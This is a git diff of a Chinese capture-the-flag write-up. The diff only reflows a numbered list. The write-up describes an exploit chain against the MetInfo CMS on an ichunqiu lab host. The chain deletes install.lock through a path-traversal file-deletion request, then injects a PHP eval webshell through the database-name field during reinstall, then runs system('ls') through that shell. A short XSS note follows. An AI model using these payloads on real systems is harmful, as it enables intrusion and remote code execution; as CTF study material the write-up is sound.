@@ -7,39 +7,37 @@ date: 2018-07-23 20:33:53
 
 ## pentest
 
-1. 御剑扫描
+御剑扫描
 
-2. 经过目录扫描，发现`file/file.php`
+经过目录扫描，发现`file/file.php`
 
-   根据网页最后提示:
+根据网页最后提示:
 
-   ```
-   DELETE FILE
-   Sorry,no filename!
-   ```
+```
+DELETE FILE
+Sorry,no filename!
+```
 
-   可以猜测存在任意文件删除漏洞。
+可以猜测存在任意文件删除漏洞。
 
-3. 首先我们删除`install.lock`
+首先我们删除`install.lock`
 
-   ```
-   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
-   ```
+```
+http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
+```
+重装metinfo，重装的时候数据库名填写 
 
-4. 重装metinfo，重装的时候数据库名填写 
+```
+met#*/@eval($_GET[1]);/*
+```
 
-   ```
-   met#*/@eval($_GET[1]);/*
-   ```
+数据库密码为`root`
 
-   数据库密码为`root`
+执行shell即可
 
-5. 执行shell即可
-
-   ```
-   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);
-   ```
-
+```
+http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);
+```
 ## mysqlonline
 
 首先通过mysql查询，经过hex编码在输出，可以造成xss。
